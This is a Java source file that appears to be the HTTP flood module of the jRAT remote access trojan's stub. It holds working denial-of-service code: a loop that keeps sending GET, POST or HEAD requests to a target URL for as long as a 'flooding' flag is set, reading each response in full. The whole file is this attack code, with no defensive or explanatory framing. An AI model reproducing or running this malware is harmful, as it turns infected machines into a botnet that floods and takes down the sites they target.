package su.jrat.stub.flood;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;

import su.jrat.stub.Constants;


public class HTTP implements Runnable {

	public String target;
	public int method;

	public HTTP(String t, int method) {
		target = t;
		this.method = method;
	}

	public void run() {
		while (Constants.flooding) {
			try {
				if (method == Constants.HTTP_GET) {
					URL url = new URL(target);
					HttpURLConnection con = (HttpURLConnection) url.openConnection();
					con.connect();
					while (con.getInputStream().read() != -1) {

					}
				} else if (method == Constants.HTTP_POST) {
					URL url = new URL(target.substring(0, target.lastIndexOf("?")));
					URLConnection conn = url.openConnection();
					conn.setDoOutput(true);
					OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
					wr.write(target.substring(target.lastIndexOf("?") + 1, target.length()));
					wr.flush();
					BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
					while (rd.readLine() != null) {

					}
					wr.close();
					rd.close();
				} else if (method == Constants.HTTP_HEAD) {
					URL url = new URL(target);
					HttpURLConnection conn = (HttpURLConnection) url.openConnection();
					conn.setRequestMethod("HEAD");
					conn.setUseCaches(false);
					conn.getResponseCode();
				}
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}

}
